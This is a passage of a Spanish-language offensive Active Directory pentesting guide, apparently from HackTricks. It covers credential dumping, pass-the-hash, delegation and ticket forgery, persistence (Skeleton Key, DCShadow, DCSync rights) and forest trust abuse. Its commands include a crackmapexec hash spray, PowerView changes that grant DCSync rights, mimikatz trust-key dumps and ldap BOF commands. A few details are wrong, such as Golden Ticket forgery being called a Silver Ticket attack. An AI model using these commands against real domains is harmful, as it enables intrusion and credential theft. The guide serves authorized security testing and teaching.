Con credenciales de dominio o una sesión de usuario, vuelve a revisar los [**ataques de relay**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM: las técnicas de enumeración autenticada y coerción pueden exponer rutas de relay que no estaban disponibles durante el reconocimiento sin autenticar.

### Buscar credenciales en recursos compartidos de equipos | Recursos compartidos SMB

Ahora que tienes algunas credenciales básicas, deberías comprobar si puedes **encontrar** algún **archivo interesante compartido dentro de AD**. Podrías hacerlo manualmente, pero es una tarea muy aburrida y repetitiva (y más aún si encuentras cientos de documentos que debes revisar).

[**Sigue este enlace para conocer herramientas que podrías usar.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Robar credenciales NTLM

Si puedes **acceder a otros equipos o recursos compartidos**, podrías **colocar archivos** (como un archivo SCF) que, si alguien accede a ellos, **desencade**nen una autenticación NTLM contra ti, para que puedas **robar** el **desafío NTLM** y descifrarlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

Esta vulnerabilidad permitía que cualquier usuario autenticado **comprometiera el controlador de dominio**.


{{#ref}}
printnightmare.md
{{#endref}}

## Escalada de privilegios en Active Directory CON credenciales/sesión privilegiadas

**Para las siguientes técnicas no basta con ser un usuario de dominio normal; necesitas privilegios o credenciales especiales para realizar estos ataques.**

### Extracción de hashes

Con suerte, has conseguido **comprometer alguna cuenta de administrador local** mediante [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md), incluido el relay, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalando privilegios localmente](../windows-local-privilege-escalation/index.html).\
Luego, es hora de volcar todos los hashes de la memoria y del equipo local.\
[**Lee esta página sobre las distintas formas de obtener los hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Una vez que tengas el hash de un usuario**, puedes usarlo para **suplantar su identidad**.\
Necesitas usar alguna **herramienta** que **realice** la **autenticación NTLM usando** ese **hash**, **o** puedes crear un nuevo **sessionlogon** e **inyectar** ese **hash** en **LSASS**, para que se use cuando se realice cualquier **autenticación NTLM**. Esto último es lo que hace mimikatz.\
[**Lee esta página para obtener más información.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

Este ataque busca **usar el hash NTLM del usuario para solicitar tickets Kerberos**, como alternativa al método habitual Pass The Hash mediante el protocolo NTLM. Por lo tanto, puede ser especialmente **útil en redes donde el protocolo NTLM está deshabilitado** y solo se permite **Kerberos** como protocolo de autenticación.


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

En el método de ataque **Pass The Ticket (PTT)**, los atacantes **roban el ticket de autenticación de un usuario** en lugar de su contraseña o sus hashes. Luego, usan este ticket robado para **suplantar al usuario** y obtener acceso no autorizado a recursos y servicios de la red.


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Reutilización de credenciales

Si tienes el **hash** o la **contraseña** de un **administrador local**, deberías intentar **iniciar sesión localmente** en otros **equipos** con esas credenciales.

```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```

> [!WARNING]
> Ten en cuenta que esto genera bastante **ruido** y **LAPS** lo **mitigaría**.

### Abuso de MSSQL y Trusted Links

Si un usuario tiene privilegios para **acceder a instancias MSSQL**, podría **ejecutar comandos** en el host MSSQL (si se ejecuta como SA), **robar** el **hash** NetNTLM o incluso realizar un **ataque** de **relay**.\
Si una instancia MSSQL es de confianza para otra instancia mediante un vínculo de base de datos, un usuario con privilegios sobre la base de datos vinculada podría **usar la relación de confianza para ejecutar consultas en la otra instancia**. Estas relaciones de confianza se pueden encadenar y eventualmente podrían llegar a una base de datos mal configurada en la que el usuario pueda ejecutar comandos.\
**Los vínculos entre bases de datos funcionan incluso a través de trusts entre forests.**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### Abuso de plataformas de gestión de activos y despliegue de TI

Las suites de inventario y despliegue de terceros suelen ofrecer vías potentes para acceder a credenciales y ejecutar código. Consulta:

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Delegación sin restricciones

Si encuentras algún objeto Computer con el atributo [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) y tienes privilegios de dominio en el equipo, podrás volcar los TGT de la memoria de todos los usuarios que inicien sesión en el equipo.\
Así que, si un **Domain Admin inicia sesión en el equipo**, podrás volcar su TGT e impersonarlo mediante [Pass the Ticket](pass-the-ticket.md).\
Gracias a la delegación restringida, incluso podrías **comprometer automáticamente un Print Server** (con suerte, será un DC).


{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Delegación restringida

Si se permite que un usuario o equipo use "Constrained Delegation", podrá **impersonar a cualquier usuario para acceder a algunos servicios de un equipo**.\
Entonces, si **comprometes el hash** de ese usuario/equipo, podrás **impersonar a cualquier usuario** (incluso a administradores de dominio) para acceder a algunos servicios.


{{#ref}}
constrained-delegation.md
{{#endref}}

### Delegación restringida basada en recursos

Tener privilegios **WRITE** sobre un objeto de Active Directory de un equipo remoto permite obtener ejecución de código con **privilegios elevados**:


{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Abuso de permisos/ACL

El usuario comprometido podría tener algunos **privilegios interesantes sobre ciertos objetos del dominio** que podrían permitirte moverte lateralmente o **escalar** privilegios.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Abuso del servicio Printer Spooler

Descubrir un **servicio Spool a la escucha** en el dominio puede **abusarse** para **obtener nuevas credenciales** y **escalar privilegios**.


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Abuso de sesiones de terceros

Si **otros usuarios** **acceden** a la máquina **comprometida**, es posible **obtener credenciales de la memoria** e incluso **inyectar beacons en sus procesos** para impersonarlos.\
Normalmente, los usuarios accederán al sistema mediante RDP; aquí tienes cómo realizar un par de ataques contra sesiones RDP de terceros:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** proporciona un sistema para gestionar la **contraseña del Administrator local** en equipos unidos al dominio, garantizando que sea **aleatoria**, única y que se **cambie** con frecuencia. Estas contraseñas se almacenan en Active Directory y el acceso se controla mediante ACL, de modo que solo los usuarios autorizados puedan acceder a ellas. Con permisos suficientes para acceder a estas contraseñas, es posible pivotar a otros equipos.


{{#ref}}
laps.md
{{#endref}}

### Robo de certificados

**Recopilar certificados** de la máquina comprometida podría servir para escalar privilegios dentro del entorno:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Abuso de plantillas de certificados

Si hay **plantillas vulnerables** configuradas, es posible abusar de ellas para escalar privilegios:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-explotación con una cuenta con privilegios elevados

### Volcado de credenciales del dominio

Cuando obtengas privilegios de **Domain Admin** o, mejor aún, de **Enterprise Admin**, puedes **volcar** la **base de datos del dominio**: _ntds.dit_.

[**Aquí encontrarás más información sobre el ataque DCSync**](dcsync.md).

[**Aquí encontrarás más información sobre cómo robar el archivo NTDS.dit**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

Un archivo de copia de seguridad legible que contenga `ntds.dit` junto con la hive `SYSTEM` debe considerarse material de directorio expuesto incluso antes de extraerlo. Que un hash de contraseña esté obsoleto no significa que otros atributos del objeto sean seguros: campos como `description` pueden contener credenciales o notas operativas. Primero inspecciona los nombres de los archivos del archivo comprimido y evita que el contenido extraído de la base de datos aparezca en los resultados de la enumeración rutinaria.

### Privesc como persistencia

Algunas de las técnicas comentadas anteriormente se pueden usar para persistencia.\
Por ejemplo, podrías:

- Hacer que los usuarios sean vulnerables a [**Kerberoast**](kerberoast.md)

  ```bash
  Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
  ```

- Hacer que los usuarios sean vulnerables a [**ASREPRoast**](asreproast.md)

  ```bash
  Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
  ```

- Otorgar privilegios de [**DCSync**](#dcsync) a un usuario

  ```bash
  Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
  ```

### Silver Ticket

El **ataque Silver Ticket** crea un **ticket Ticket Granting Service (TGS) legítimo** para un servicio específico mediante el uso del **hash NTLM** (por ejemplo, el **hash de la cuenta del equipo**). Este método se utiliza para **acceder a los privilegios del servicio**.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Un **ataque Golden Ticket** consiste en que un atacante obtiene acceso al **hash NTLM de la cuenta krbtgt** en un entorno de Active Directory (AD). Esta cuenta es especial porque se utiliza para firmar todos los **Ticket Granting Tickets (TGT)**, esenciales para autenticarse dentro de la red de AD.

Una vez que el atacante obtiene este hash, puede crear **TGT** para cualquier cuenta que elija (ataque Silver Ticket).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Son como los Golden Ticket falsificados de una forma que **elude los mecanismos habituales de detección de Golden Ticket.**


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Persistencia de cuentas con certificados**

**Tener certificados de una cuenta o poder solicitarlos** es una muy buena forma de mantener la persistencia en la cuenta de un usuario (aunque cambie la contraseña):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Persistencia en el dominio con certificados**

**También es posible usar certificados para mantener la persistencia con privilegios elevados dentro del dominio:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### Grupo AdminSDHolder

El objeto **AdminSDHolder** de Active Directory garantiza la seguridad de los **grupos privilegiados** (como Domain Admins y Enterprise Admins) aplicando una **lista de control de acceso (ACL)** estándar a estos grupos para impedir cambios no autorizados. Sin embargo, esta función puede explotarse: si un atacante modifica la ACL de AdminSDHolder para otorgar acceso total a un usuario normal, ese usuario obtiene un amplio control sobre todos los grupos privilegiados. Así, esta medida de seguridad, concebida para proteger, puede volverse en su contra y permitir accesos indebidos si no se supervisa de cerca.

[**Más información sobre el grupo AdminDSHolder aquí.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### Credenciales DSRM

En cada **Domain Controller (DC)** existe una cuenta de **administrador local**. Al obtener derechos de administrador en una máquina de este tipo, se puede extraer el hash del Administrador local mediante **mimikatz**. Después, es necesario modificar el registro para **habilitar el uso de esta contraseña**, lo que permite el acceso remoto a la cuenta del Administrador local.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### Persistencia mediante ACL

Se pueden **otorgar** **permisos especiales** a un **usuario** sobre determinados objetos del dominio para que pueda **escalar privilegios en el futuro**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Descriptores de seguridad

Los **descriptores de seguridad** se utilizan para **almacenar** los **permisos** que un **objeto** tiene **sobre** otro **objeto**. Si puedes hacer un **pequeño cambio** en el **descriptor de seguridad** de un objeto, puedes obtener privilegios muy interesantes sobre ese objeto sin tener que pertenecer a un grupo privilegiado.


{{#ref}}
security-descriptors.md
{{#endref}}

### Objetos dinámicos: antiforense / evasión

Abusa de la clase auxiliar `dynamicObject` para crear entidades de seguridad/GPO/registros DNS de corta duración con `entryTTL`/`msDS-Entry-Time-To-Die`; se eliminan automáticamente sin dejar tombstones, borrando las evidencias de LDAP, pero dejando SID huérfanos, referencias `gPLink` rotas o respuestas DNS almacenadas en caché (por ejemplo, contaminación de ACE de AdminSDHolder o redirecciones maliciosas de `gPCFileSysPath`/DNS integrado en AD).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Modifica **LSASS** en memoria para establecer una **contraseña universal** que permita acceder a todas las cuentas del dominio.


{{#ref}}
skeleton-key.md
{{#endref}}

### SSP personalizado

[Aprende aquí qué es un SSP (Security Support Provider).](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Puedes crear tu **propio SSP** para **capturar en texto claro** las **credenciales** utilizadas para acceder a la máquina.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Registra un **nuevo Domain Controller** en AD y lo utiliza para **aplicar atributos** (SIDHistory, SPN...) a objetos especificados **sin** dejar **registros** de las **modificaciones**. Necesitas privilegios **DA** y estar dentro del **dominio raíz**.\
Ten en cuenta que, si usas datos incorrectos, aparecerán registros bastante feos.


{{#ref}}
dcshadow.md
{{#endref}}

### Persistencia mediante LAPS

Anteriormente hablamos de cómo escalar privilegios si tienes **permisos suficientes para leer las contraseñas de LAPS**. Sin embargo, estas contraseñas también pueden utilizarse para **mantener la persistencia**.\
Consulta:


{{#ref}}
laps.md
{{#endref}}

## Escalada de privilegios en el bosque: relaciones de confianza entre dominios

Microsoft considera que el **bosque** es el límite de seguridad. Esto implica que **comprometer un único dominio podría permitir comprometer todo el bosque**.<sup>[[1]](#references)</sup>

### Información básica

Una [**relación de confianza entre dominios**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) es un mecanismo de seguridad que permite a un usuario de un **dominio** acceder a recursos de otro **dominio**. Básicamente, crea un vínculo entre los sistemas de autenticación de ambos dominios, lo que permite que las verificaciones de autenticación se realicen sin interrupciones. Cuando los dominios establecen una relación de confianza, intercambian y conservan ciertas **claves** en sus **Domain Controllers (DC)**, que son fundamentales para la integridad de dicha relación.

En un escenario típico, si un usuario quiere acceder a un servicio de un **dominio de confianza**, primero debe solicitar un ticket especial, conocido como **TGT entre reinos**, al DC de su propio dominio. Este TGT se cifra con una **clave** compartida acordada por ambos dominios. Después, el usuario presenta este TGT al **DC del dominio de confianza** para obtener un ticket de servicio (**TGS**). Si el DC del dominio de confianza valida correctamente el TGT entre reinos, emite un TGS que concede al usuario acceso al servicio.

**Pasos**:

1. Un **equipo cliente** del **Dominio 1** inicia el proceso usando su **hash NTLM** para solicitar un **Ticket Granting Ticket (TGT)** a su **Domain Controller (DC1)**.
2. DC1 emite un TGT nuevo si el cliente se autentica correctamente.
3. A continuación, el cliente solicita a DC1 un **TGT entre reinos**, necesario para acceder a los recursos del **Dominio 2**.
4. El TGT entre reinos se cifra con una **clave de confianza** compartida entre DC1 y DC2 como parte de la relación de confianza bidireccional entre ambos dominios.
5. El cliente lleva el TGT entre reinos al **Domain Controller del Dominio 2 (DC2)**.
6. DC2 verifica el TGT entre reinos usando la clave de confianza compartida y, si es válido, emite un **Ticket Granting Service (TGS)** para el servidor del Dominio 2 al que el cliente quiere acceder.
7. Por último, el cliente presenta este TGS al servidor, cifrado con el hash de la cuenta del servidor, para obtener acceso al servicio del Dominio 2.

### Diferentes relaciones de confianza

Es importante tener en cuenta que **una relación de confianza puede ser unidireccional o bidireccional**. En las relaciones bidireccionales, ambos dominios confían el uno en el otro; en una relación **unidireccional**, uno de los dominios es el **dominio de confianza** y el otro es el **dominio que confía**. En este último caso, **solo podrás acceder a los recursos del dominio que confía desde el dominio de confianza**.

Si el Dominio A confía en el Dominio B, A es el dominio que confía y B es el dominio de confianza. Además, en el **Dominio A**, esta sería una **relación de confianza saliente**; y en el **Dominio B**, una **relación de confianza entrante**.

**Diferentes relaciones de confianza**

- **Relaciones de confianza padre-hijo**: Es una configuración habitual dentro del mismo bosque, donde un dominio hijo tiene automáticamente una relación de confianza transitiva y bidireccional con su dominio padre. Básicamente, esto permite que las solicitudes de autenticación fluyan sin interrupciones entre el dominio padre y el hijo.
- **Relaciones de confianza entre dominios**: También llamadas «relaciones de confianza de acceso directo», se establecen entre dominios hijo para acelerar los procesos de referencia. En bosques complejos, las referencias de autenticación suelen tener que subir hasta la raíz del bosque y luego bajar al dominio de destino. Al crear relaciones de confianza directas, se acorta el recorrido, algo especialmente útil en entornos geográficamente dispersos.
- **Relaciones de confianza externas**: Se establecen entre dominios distintos y no relacionados, y son no transitivas por naturaleza. Según la [documentación de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>), las relaciones de confianza externas son útiles para acceder a recursos de un dominio fuera del bosque actual que no está conectado mediante una relación de confianza entre bosques. El filtrado de SID refuerza la seguridad de estas relaciones.
- **Relaciones de confianza de raíz de árbol**: Se establecen automáticamente entre el dominio raíz del bosque y una nueva raíz de árbol añadida. Aunque no son muy habituales, son importantes para añadir nuevos árboles de dominio a un bosque, ya que permiten que mantengan un nombre de dominio único y garantizan la transitividad bidireccional. Puedes encontrar más información en la [guía de Microsoft](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Relaciones de confianza entre bosques**: Este tipo de relación de confianza es bidireccional y transitiva entre dos dominios raíz de bosque, y también aplica el filtrado de SID para reforzar las medidas de seguridad.
- **Relaciones de confianza MIT**: Se establecen con dominios Kerberos que no son de Windows y son [compatibles con RFC4120](https://tools.ietf.org/html/rfc4120). Las relaciones de confianza MIT son más especializadas y se adaptan a entornos que requieren integración con sistemas basados en Kerberos fuera del ecosistema de Windows.

#### Otras diferencias en las **relaciones de confianza**

- Una relación de confianza también puede ser **transitiva** (A confía en B, B confía en C, entonces A confía en C) o **no transitiva**.
- Una relación de confianza puede configurarse como **bidireccional** (ambos confían el uno en el otro) o **unidireccional** (solo uno confía en el otro).

### Vía de ataque

1. **Enumerar** las relaciones de confianza
2. Comprobar si alguna **entidad de seguridad** (usuario/grupo/equipo) tiene **acceso** a recursos del **otro dominio**, quizá mediante entradas ACE o por pertenecer a grupos del otro dominio. Buscar **relaciones entre dominios** (probablemente la relación de confianza se creó por ese motivo).
   1. En este caso, kerberoast podría ser otra opción.
3. **Comprometer** las **cuentas** que puedan servir para pivotar entre dominios.

Los atacantes con acceso a recursos de otro dominio pueden conseguirlo mediante tres mecanismos principales:

- **Pertenencia a grupos locales**: Las entidades de seguridad pueden añadirse a grupos locales de equipos, como el grupo «Administradores» de un servidor, lo que les otorga un control considerable sobre ese equipo.
- **Pertenencia a grupos de dominios externos**: Las entidades de seguridad también pueden pertenecer a grupos del dominio externo. Sin embargo, la eficacia de este método depende del tipo de relación de confianza y del ámbito del grupo.
- **Listas de control de acceso (ACL)**: Las entidades de seguridad pueden aparecer en una **ACL**, especialmente como entidades en **ACE** dentro de una **DACL**, lo que les da acceso a recursos específicos. Para profundizar en el funcionamiento de las ACL, las DACL y las ACE, el documento técnico titulado «[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)» es un recurso inestimable.<sup>[[17]](#references)</sup>

### Buscar usuarios/grupos externos con permisos

Puedes consultar **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** para encontrar entidades de seguridad externas en el dominio. Serán usuarios/grupos de **un dominio/bosque externo**.

Puedes comprobarlo en **Bloodhound** o usar powerview:

```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```

### Child-to-Parent forest privilege escalation

```bash
# From PowerView
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```

Otras formas de enumerar las relaciones de confianza de dominio:

```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```

> [!WARNING]
> Hay **2 claves de confianza**, una para _Child --> Parent_ y otra para _Parent_ --> _Child_.\
> Puedes ver cuál utiliza el dominio actual con:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Escala a Enterprise admin del dominio secundario/principal abusando de la confianza mediante SID-History injection:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Explotar Configuration NC con permisos de escritura

Es fundamental comprender cómo se puede explotar Configuration Naming Context (NC). Configuration NC funciona como repositorio central de datos de configuración en los entornos de Active Directory (AD) de un bosque. Estos datos se replican en todos los Domain Controller (DC) del bosque, y los DC con permisos de escritura mantienen una copia modificable de Configuration NC. Para explotar esto, se necesitan **privilegios de SYSTEM en un DC**, preferiblemente en un DC secundario.

**Vincular una GPO al sitio del DC raíz**

El contenedor Sites de Configuration NC incluye información sobre los sitios de todos los equipos unidos al dominio dentro del bosque de AD. Con privilegios de SYSTEM en cualquier DC, los atacantes pueden vincular GPOs a los sitios del DC raíz. Esta acción puede comprometer el dominio raíz al manipular las políticas aplicadas a esos sitios.

Para obtener información detallada, se puede consultar la investigación sobre [Bypassing SID Filtering](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-4).<sup>[[12]](#references)</sup>

**Comprometer cualquier gMSA del bosque**

Un vector de ataque consiste en atacar gMSAs con privilegios elevados dentro del dominio. La clave raíz de KDS, esencial para calcular las contraseñas de los gMSA, se almacena en Configuration NC. Con privilegios de SYSTEM en cualquier DC, es posible acceder a la clave raíz de KDS y calcular las contraseñas de cualquier gMSA del bosque.

Encontrarás un análisis detallado y una guía paso a paso en:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Ataque complementario contra MSA delegadas (BadSuccessor – abuso de atributos de migración):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Investigación externa adicional: [Golden gMSA Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-5).<sup>[[13]](#references)</sup>

**Ataque mediante cambios en el esquema**

Este método requiere paciencia: hay que esperar a que se creen nuevos objetos de AD con privilegios. Con privilegios de SYSTEM, un atacante puede modificar el esquema de AD para otorgar a cualquier usuario control total sobre todas las clases. Esto podría permitir el acceso no autorizado y el control de objetos de AD recién creados.

Encontrarás más información en [Schema Change Trust Attacks](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-6).<sup>[[14]](#references)</sup>

**De DA a EA con ADCS ESC5**

La vulnerabilidad ADCS ESC5 permite controlar objetos de Public Key Infrastructure (PKI) para crear una plantilla de certificado que permita autenticarse como cualquier usuario del bosque. Como los objetos PKI residen en Configuration NC, comprometer un DC secundario con permisos de escritura permite ejecutar ataques ESC5.

Puedes leer más detalles en [From DA to EA with ESC5](https://specterops.io/blog/2023/05/16/from-da-to-ea-with-esc5/).<sup>[[15]](#references)</sup> En entornos sin ADCS, el atacante puede configurar los componentes necesarios, como se explica en [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/).<sup>[[16]](#references)</sup>

### Dominio de bosque externo: unidireccional (entrante) o bidireccional

```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```

En este escenario, **un dominio externo confía en tu dominio**, lo que te otorga **permisos indeterminados** sobre él. Deberás averiguar **qué principales de tu dominio tienen qué nivel de acceso al dominio externo** y luego intentar explotarlo:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Dominio de bosque externo - Unidireccional (saliente)

```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```

En este escenario, **tu dominio** está **confiando** algunos **privilegios** a un principal de **otros dominios**.

Sin embargo, cuando un **dominio es de confianza** para el dominio que confía en él, el dominio de confianza **crea un usuario** con un **nombre predecible** y usa como **contraseña la contraseña de confianza**. Esto significa que es posible **acceder a un usuario del dominio que confía para entrar en el dominio de confianza**, enumerarlo e intentar escalar más privilegios:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Otra forma de comprometer el dominio de confianza es encontrar un [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links) creado en la **dirección opuesta** a la confianza entre dominios (algo poco común).

Otra forma de comprometer el dominio de confianza es esperar en una máquina a la que un **usuario del dominio de confianza pueda acceder** para iniciar sesión mediante **RDP**. Entonces, el atacante podría inyectar código en el proceso de la sesión RDP y **acceder desde allí al dominio de origen de la víctima**.\
Además, si la **víctima montó su disco duro**, el atacante podría almacenar **backdoors** en la **carpeta de inicio del disco duro** desde el proceso de la **sesión RDP**. Esta técnica se llama **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Mitigación del abuso de la confianza entre dominios

### **SID Filtering:**

- El riesgo de ataques que aprovechan el atributo SID history a través de confianzas entre bosques se mitiga mediante SID Filtering, que está activado de forma predeterminada en todas las confianzas entre bosques. Esto se basa en la suposición de que las confianzas dentro de un bosque son seguras, considerando el bosque, y no el dominio, como límite de seguridad, según la postura de Microsoft.
- Sin embargo, hay una salvedad: SID Filtering podría interrumpir aplicaciones y el acceso de usuarios, por lo que a veces se desactiva.

### **Selective Authentication:**

- En las confianzas entre bosques, el uso de Selective Authentication garantiza que los usuarios de ambos bosques no se autentiquen automáticamente. En su lugar, se requieren permisos explícitos para que los usuarios accedan a dominios y servidores dentro del dominio o bosque que confía.
- Es importante tener en cuenta que estas medidas no protegen contra la explotación del contexto de nombres de configuración (NC) modificable ni contra ataques a la cuenta de confianza.

[**Más información sobre las confianzas entre dominios en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)<sup>[[3]](#references)</sup>

## Abuso de AD basado en LDAP desde implantes en el host

La [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) vuelve a implementar primitivas LDAP al estilo de bloodyAD como Beacon Object Files x64 que se ejecutan completamente dentro de un implante en el host (por ejemplo, Adaptix C2). Los operadores compilan el paquete con `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, cargan `ldap.axs` y luego ejecutan `ldap <subcommand>` desde el beacon. Todo el tráfico usa el contexto de seguridad del inicio de sesión actual a través de LDAP (389) con signing/sealing o LDAPS (636) con confianza automática en el certificado, por lo que no se necesitan proxies socks ni artefactos en disco.<sup>[[4]](#references)</sup>

### Enumeración LDAP desde el implante

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` y `get-groupmembers` resuelven nombres cortos/rutas de OU en DN completos y vuelcan los objetos correspondientes.
- `get-object`, `get-attribute` y `get-domaininfo` obtienen atributos arbitrarios (incluidos descriptores de seguridad), además de los metadatos del bosque/dominio de `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` y `get-rbcd` muestran candidatos para roasting, configuraciones de delegación y descriptores existentes de [Resource-based Constrained Delegation](resource-based-constrained-delegation.md) directamente desde LDAP.
- `get-acl` y `get-writable --detailed` analizan la DACL para enumerar trustees, derechos (GenericAll/WriteDACL/WriteOwner/escritura de atributos) y herencia, lo que proporciona objetivos inmediatos para la escalada de privilegios mediante ACL.

```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```

### Primitivas de escritura LDAP para escalada y persistencia

- Los BOF de creación de objetos (`add-user`, `add-computer`, `add-group`, `add-ou`) permiten al operador preparar nuevos principals o cuentas de máquina en cualquier lugar donde existan permisos sobre la OU. `add-groupmember`, `set-password`, `add-attribute` y `set-attribute` permiten secuestrar directamente los objetivos una vez que se encuentran permisos de escritura sobre propiedades.
- Los comandos centrados en ACL, como `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` y `add-dcsync`, convierten WriteDACL/WriteOwner sobre cualquier objeto de AD en restablecimientos de contraseñas, control de pertenencia a grupos o privilegios de replicación DCSync, sin dejar rastros de PowerShell/ADSI. Los comandos `remove-*` correspondientes eliminan las ACE inyectadas.

### Delegación, roasting y abuso de Kerberos

- `add-spn`/`set-spn` convierten al instante a un usuario comprometido en un objetivo de Kerberoast; `add-asreproastable` (cambio de UAC) lo marca para AS-REP roasting sin tocar la contraseña.
- Las macros de delegación (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) modifican `msDS-AllowedToDelegateTo`, los indicadores de UAC o `msDS-AllowedToActOnBehalfOfOtherIdentity` desde el beacon, lo que habilita rutas de ataque de delegación constrained/unconstrained/RBCD y elimina la necesidad de usar PowerShell remoto o RSAT.

### Inyección de sidHistory, reubicación de OU y configuración de la superficie de ataque

- `add-sidhistory` inyecta SID privilegiados en el historial de SID de un principal bajo control (consulta [Inyección de SID-History](sid-history-injection.md)), lo que proporciona herencia de acceso encubierta íntegramente mediante LDAP/LDAPS.
